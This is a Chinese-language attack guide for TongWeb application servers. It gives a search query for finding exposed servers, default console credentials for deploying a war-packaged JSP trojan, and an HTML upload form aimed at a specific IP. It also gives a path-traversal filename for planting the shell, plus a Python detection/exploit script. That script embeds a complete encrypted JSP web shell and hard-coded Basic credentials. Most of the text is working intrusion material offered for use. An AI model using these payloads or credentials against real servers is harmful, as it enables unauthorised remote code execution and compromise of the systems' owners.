# 东方通组件文件上传

+ Tongweb查找：
```server
server="TongWeb Server"
```

- Tongweb默认登录页面：
```url
/console/
```
登录界面默认账号密码(成功登录可直接部署war包)：
```url
thanos/thanos123.com	（常用）
thanos/twns
twns/thanos123.com
thanos/twnt123.com
twns/twnt123.com
```

进入后台后部署war包指南
https://blog.csdn.net/m0_37048012/article/details/104558893
（一般jdbc会已经配好了，只需要进入EJB-应用管理部署war包即可）
成功部署后，网站肯会在其他端口，进入其他端口访问木马即可。
打包war包：
```sh
jar cvf shell.war test.jsp
```

文件上传接口：
```url
/sysweb/upload
```

文件上传payload：
```html
<html>
<head>
<title>Tongweb upload</title>
<body>
<h5>Mucn Tongweb UPLoadtest</h5>
<form action="http://124.71.176.140:8080/sysweb/upload" enctype="multipart/form-data" method="POST">
  <p>shell addr: <input type="file" name="file" /></p>
  <input type="submit" value="Submit" />
</form>
</body>
</head>
</html>
```

Action替换为其他地址即可。

上传包：
上传路径一定设置成：
```url
../../applications/sysweb/test.jsp（上传filename参数要把参数值的双引号删除）
```


接着访问就好
```url
/sysweb/test.jsp
```

初版POC[只能用于检测，无法漏洞利用]v1

```python
# _*_ coding:utf-8 _*_
import requests
import re
from requests.packages import urllib3
import ssl

print('''

  ___________                                ___.                       .__                   .___
  \__    ___/___   ____    ______  _  __ ____\_ |__         __ ________ |  |   _________    __| _/
    |    | /  _ \ /    \  / ___\ \/ \/ // __ \| __ \       |  |  \____ \|  |  /  _ \__  \  / __ | 
    |    |(  <_> )   |  \/ /_/  >     /\  ___/| \_\ \      |  |  /  |_> >  |_(  <_> ) __ \/ /_/ | 
    |____| \____/|___|  /\___  / \/\_/  \___  >___  /_____ |____/|   __/|____/\____(____  |____ | 
                      \//_____/             \/    \/_____/       |__|                   \/     \/ 
                       

- 使用方式：在下面输入ip或域名（例如：http://123.7.9.1:9088）
- Time：2021.4.17 by mucn
- fofa: server="TongWeb Server"
''')

#   print(str(requests.Request('POST',url=url,headers=header2,data=data).prepare().body.decode('ascii')))

#检测模块
def jiance(terget_url,ip):
    terget=terget_url+"/sysweb/upload"

    header={
        "Host": "{}".format(ip),
        "Proxy-Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Authorization": "Basic Y2xpOmNsaTEyMy5jb20=",#cli:cli123.com
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    test=terget_url+"/console"
    
    context = ssl._create_unverified_context()#t跳过ssl验证
    #ssl._create_default_https_context = ssl._create_unverified_context
    tong=requests.get(url=test,headers=header,verify=False)
    tong01=requests.get(url=terget,headers=header,verify=False)
    
    if tong01.status_code!=200:
        print("- 可能默认账号密码不正确请自行手测账户密码")
    else:
        print("- 检测成功，可能存在漏洞，可手工测试上传")
        # print("访问状态：{}".format(tong01.status_code))
        # tong02=requests.post(url=url,headers=header2,data=data)

#利用模块
def exp(terget,ip):
    header2={
    "Host": "{}".format(ip),
    "Content-Length": "2802",
    "Cache-Control": "max-age=0",
    "Authorization": "Basic Y2xpOmNsaTEyMy5jb20=",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "null",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary3YhFjwefvnnA9ky9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close"
    }
    data='''
    ------WebKitFormBoundary3YhFjwefvnnA9ky9
    Content-Disposition: form-data; name="file"; filename=test.txt
    Content-Type: image/jpeg

    mucn
    <%! String xc="f9b3ee00809aa284"; String pass="mucn"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs }); value = value.replace("\n", "").replace("\r", "");} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><% try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(pageContext.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", new String(data));Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(pageContext);response.getWriter().write(md5.substring(0,16));response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>
    ------WebKitFormBoundary3YhFjwefvnnA9ky9--
    '''

    file={
        'filename':('index_bak.jsp',open('gsljsp.jpg', 'rb'), 'image/jpg')
    }

if __name__ == '__main__':
    terget=input("输入站点：")
    str_1=terget+'/'
    if 'https://' in str_1[:10]:
        ip=re.findall('https://(.*?)/',str_1)
    elif 'http://' in str_1[:10]:
        ip=re.findall('http://(.*?)/',str_1)
    else:
        exit("未知错误，请检查url。") 

    jiance(terget,ip)
    # | str(re.findall(,terget))
    # print(''.join(ip))
    #exp(terget)
    
```
